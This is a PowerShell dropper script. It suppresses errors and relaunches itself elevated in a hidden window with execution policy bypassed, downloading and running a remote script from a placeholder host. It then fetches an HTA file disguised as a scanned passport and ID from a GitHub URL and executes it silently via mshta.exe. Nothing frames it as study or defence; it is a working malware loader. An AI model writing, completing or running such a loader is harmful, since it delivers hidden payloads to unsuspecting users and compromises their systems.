$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ----- self-elevate if not admin -----
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Start-Process powershell.exe -Verb RunAs -ArgumentList '-w','hidden','-ExecutionPolicy','Bypass','-Command',"iwr 'https://your-host.com/a' -OutFile `"$env:TEMP\a.ps1`"; . `"$env:TEMP\a.ps1`""
    exit
}

# ----- now elevated -----

# fetch HTA
$htaUrl  = "https://raw.githubusercontent.com/rotalbilly5-sketch/Dream/main/Scanned_Passport_And_ID.hta"
$htaPath = "$env:TEMP\Scanned_Passport_And_ID.hta"
try {
    (New-Object Net.WebClient).DownloadFile($htaUrl, $htaPath)
} catch {}

# execute HTA via mshta
if (Test-Path $htaPath) {
    Start-Process "mshta.exe" -ArgumentList "`"$htaPath`"" -WindowStyle Hidden
}
